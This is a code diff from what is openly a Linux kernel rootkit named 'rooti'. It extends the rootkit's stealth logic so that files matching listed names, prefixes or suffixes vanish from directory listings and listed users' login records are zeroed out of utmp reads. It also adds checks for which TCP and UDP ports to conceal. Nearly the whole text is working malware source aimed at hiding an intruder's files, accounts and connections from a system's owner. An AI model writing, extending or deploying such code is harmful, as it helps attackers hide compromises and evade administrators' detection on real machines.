@@ -33,10 +33,33 @@ void rooti_showme()
 // Determines whether the file entry qualifies to be hidden
 static bool rooti_should_hide_file(struct linux_dirent64 *record)
 {
-    // Check if the entry's name begins with the prefix of hidden files
-    if (strlen(record->d_name) >= ROOTI_HIDE_PREFIX_LEN && 
-        memcmp(record->d_name, ROOTI_HIDE_PREFIX, ROOTI_HIDE_PREFIX_LEN) == 0) {
-        return true;
+    size_t prefix_len;
+    size_t suffix_len;
+    size_t filename_len;
+
+    // Check if the entry should be hidden by its name
+    for (int i = 0; i < ROOTI_HIDDEN_FILES_COUNT; i++) {
+        if (strncmp(record->d_name, ROOTI_HIDDEN_FILES[i], NAME_MAX) == 0) {
+            return true;
+        }
+    }
+    // Check if the entry's name begins with a prefix of hidden files
+    for (int i = 0; i < ROOTI_HIDDEN_FILES_PREFIXES_COUNT; i++) {
+        filename_len = strlen(record->d_name);
+        prefix_len = strlen(ROOTI_HIDDEN_FILES_PREFIXES[i]);
+        if (filename_len >= prefix_len &&
+            memcmp(record->d_name, ROOTI_HIDDEN_FILES_PREFIXES[i], prefix_len) == 0) {
+            return true;
+        }
+    }
+    // Check if the entry's name ends with a suffix of hidden files
+    for (int i = 0; i < ROOTI_HIDDEN_FILES_SUFFIXES_COUNT; i++) {
+        filename_len = strlen(record->d_name);
+        suffix_len = strlen(ROOTI_HIDDEN_FILES_SUFFIXES[i]);
+        if (filename_len >= suffix_len &&
+            memcmp(record->d_name + filename_len - suffix_len, ROOTI_HIDDEN_FILES_SUFFIXES[i], suffix_len) == 0) {
+            return true;
+        }
     }
     return false;
 }
@@ -136,12 +159,23 @@ size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, boo
     return count;
 }
 
+// Determines whether the user should be hidden or not, by username
+static bool rooti_should_hide_user(char *username)
+{
+    for (int i = 0; i < ROOTI_HIDDEN_USERS_COUNT; i++) {
+        if (strncmp(username, ROOTI_HIDDEN_USERS[i], UT_NAMESIZE) == 0) {
+            return true;
+        }
+    }
+    return false;
+}
+
 /*
     Rigs the record returned from the utmp file, hiding the record if the user should be hidden.
     This is achieved by copying the results into kernel space, filling the buffer with zeros and
     returning the rigged results back into user space.
 */
-int rooti_hide_login_entry(char *user_buf, size_t count, char *name)
+int rooti_hide_login_entry(char *user_buf, size_t count)
 {
     // Allocate a kernel buffer to store the data returned to user
     char *kernel_buf = kmalloc(count, GFP_KERNEL);
@@ -160,7 +194,7 @@ int rooti_hide_login_entry(char *user_buf, size_t count, char *name)
 
     // Check if the username contained the in the record is of a user that should be hidden
     struct utmp *utmp_buf = (struct utmp *)kernel_buf;
-    if (strncmp(utmp_buf->ut_user, name, UT_NAMESIZE) == 0) {
+    if (rooti_should_hide_user(utmp_buf->ut_user)) {
         // Match found, fill the buffer with zeros, marking it as invalid
         memset(kernel_buf, 0, count);
         // Copy the results back to user space
@@ -174,4 +208,26 @@ int rooti_hide_login_entry(char *user_buf, size_t count, char *name)
 
     kfree(kernel_buf);
     return 0;
+}
+
+// Indicates whether the given TCP port should be hidden by the rootkit
+bool rooti_should_hide_tcp_port(unsigned short port)
+{
+    for (int i = 0; i < ROOTI_HIDDEN_TCP_PORTS_COUNT; i++) {
+        if (ROOTI_HIDDEN_TCP_PORTS[i] == port) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// Indicates whether the given UDP port should be hidden by the rootkit
+bool rooti_should_hide_udp_port(unsigned short port)
+{
+    for (int i = 0; i < ROOTI_HIDDEN_UDP_PORTS_COUNT; i++) {
+        if (ROOTI_HIDDEN_UDP_PORTS[i] == port) {
+            return true;
+        }
+    }
+    return false;
 }
